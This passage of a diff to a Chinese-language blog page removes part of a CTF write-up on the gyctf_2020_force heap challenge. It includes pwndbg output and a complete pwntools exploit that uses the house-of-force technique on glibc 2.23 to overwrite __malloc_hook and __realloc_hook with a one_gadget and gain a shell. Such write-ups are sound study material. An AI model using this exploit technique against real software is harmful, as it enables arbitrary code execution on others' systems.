-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk2=add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">topchunk_addr=<span class="number">0x55e87208e290</span>+<span class="number">48</span></span><br><span class="line">success(<span class="string">&#x27;topchunk_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(topchunk_addr))</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: <span class="number">0x55e87208e2c0</span></span><br><span class="line">Size: <span class="number">0xffffffffffffffff</span></span><br></pre></td></tr></table></figure>
-<p>计算 offset 分割 top chunk：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset=malloc_hook-(topchunk_addr+<span class="number">0x10</span>)-<span class="number">0x20</span></span><br><span class="line">add(offset, <span class="string">&#x27;kkk\n&#x27;</span>)</span><br><span class="line">magic_addr=add(<span class="number">0x40</span>, <span class="string">&#x27;yhellow\n&#x27;</span>)</span><br><span class="line">success(<span class="string">&#x27;magic_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(magic_addr))</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] magic_addr &gt;&gt; <span class="number">0x7f33a5420b00</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7f33a5420b00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f33a5420b00</span> (__memalign_hook) ◂— <span class="number">0xa776f6c6c656879</span> (<span class="string">&#x27;yhellow\n&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f33a5420b08</span> (__realloc_hook) —▸ <span class="number">0x7f33a50e1a70</span> (realloc_hook_ini) ◂— push   r15</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f33a5420b10</span> (__malloc_hook) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f33a5420b18</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f33a5420b20</span> (main_arena) ◂— <span class="number">0x100000000</span></span><br></pre></td></tr></table></figure>
-<p>注意：采用“offset=malloc_hook-(topchunk_addr+0x10)”（以前总结的规律），就会申请到“main_arena”，和预期“__malloc_hook”差了 0x10 字节，推测可能是那 1字节 的误差搞得鬼（也是以前总结的规律），这 1字节 导致 0x10字节 对齐的程序“进位”了（当然有时不会有反应）</p>
-<p>我们需要劫持“realloc_hook”为“one_gadget”，劫持“malloc_hook”为“realloc_hook+0x10”，所以只要在原来 offset 的基础上减 0x20 就好了：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset=malloc_hook-(topchunk_addr+<span class="number">0x10</span>)-<span class="number">0x20</span></span><br><span class="line">add(offset, <span class="string">&#x27;kkk\n&#x27;</span>)</span><br><span class="line">magic_addr=add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(one_gadget_libc)+p64(realloc+<span class="number">0x10</span>))</span><br><span class="line">success(<span class="string">&#x27;magic_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(magic_addr))</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f4aa6c3ab00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f4aa6c3ab00</span> (__memalign_hook) ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f4aa6c3ab08</span> (__realloc_hook) —▸ <span class="number">0x7f4aa68bb27a</span> (do_system+<span class="number">1098</span>) ◂— mov    rax, qword ptr [rip + <span class="number">0x37ec37</span>]</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f4aa6c3ab10</span> (__malloc_hook) —▸ <span class="number">0x7f4aa68fa720</span> (<span class="built_in">realloc</span>+<span class="number">16</span>) ◂— sub    rsp, <span class="number">0x38</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f4aa6c3ab18</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f4aa6c3ab20</span> (main_arena) ◂— <span class="number">0x100000000</span></span><br></pre></td></tr></table></figure>
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;bin addr &#x27;</span>)</span><br><span class="line">	heap_addr=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">	success(<span class="string">&#x27;heap_add &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content\n&#x27;</span>,content)</span><br><span class="line">	<span class="keyword">return</span> heap_addr</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>():</span></span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">leak_offset=<span class="number">0xD93</span></span><br><span class="line">chunk1=add(<span class="number">0x200000</span>,<span class="string">&#x27;here&#x27;</span>)</span><br><span class="line">libc_base=chunk1+<span class="number">0x200ff0</span></span><br><span class="line">success(<span class="string">&#x27;chunk1 &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(chunk1))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">chunk2=add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">topchunk_addr=chunk2+<span class="number">32</span></span><br><span class="line">success(<span class="string">&#x27;topchunk_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(topchunk_addr))</span><br><span class="line"></span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+libc_base</span><br><span class="line">realloc=libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]+libc_base</span><br><span class="line">one_gadget_libc=onegadget[<span class="number">1</span>]+libc_base</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&#x27;one_gadget_libc &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(one_gadget_libc))</span><br><span class="line"></span><br><span class="line">offset=malloc_hook-(topchunk_addr+<span class="number">0x10</span>)-<span class="number">0x20</span></span><br><span class="line">add(offset, <span class="string">&#x27;kkk\n&#x27;</span>)</span><br><span class="line">magic_addr=add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(one_gadget_libc)+p64(realloc+<span class="number">0x10</span>))</span><br><span class="line">success(<span class="string">&#x27;magic_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(magic_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><strong>house of force 小结（2.23-64位）</strong></p>
-<p>通过本题目，我对 offset 的计算有了更深刻的理解，即使有时候 offse 有偏差也可以进行修正了</p>
-<p>另外，我对 malloc_hook 的打法也有了新的认识：先劫持“realloc_hook”为“one_gadget”，后劫持“malloc_hook”为“realloc_hook+0x10”（不能直接劫持“malloc_hook”，目前不知道原因）</p>
-<p>最后尝试了用 libc-2.27 来打 house of force，打不通，分析源码发现通不过检查（几乎打死了 house of force），得出结论：house of force 只能在 libc-2.23 中打（如果以后发现有大神可以绕过检查的话，就回来补充）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2046,7 +2088,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">297</span>
+          <span class="site-state-item-count">298</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2100,7 +2142,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">63:11</span>
+    <span title="Reading time total">63:18</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
